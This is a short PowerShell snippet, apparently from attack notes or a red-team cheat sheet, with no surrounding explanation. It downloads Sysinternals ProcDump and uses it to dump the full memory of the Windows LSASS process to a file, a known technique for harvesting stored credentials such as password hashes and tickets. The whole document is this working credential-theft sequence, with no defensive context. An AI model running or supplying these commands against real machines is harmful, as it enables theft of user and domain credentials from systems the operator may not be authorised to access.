Invoke-WebRequest -OutFile procdump.zip "https://download.sysinternals.com/files/Procdump.zip"
Expand-Archive -Path procdump.zip 
./procdump/procdump -ma lsass.exe lsass.dmp -accepteula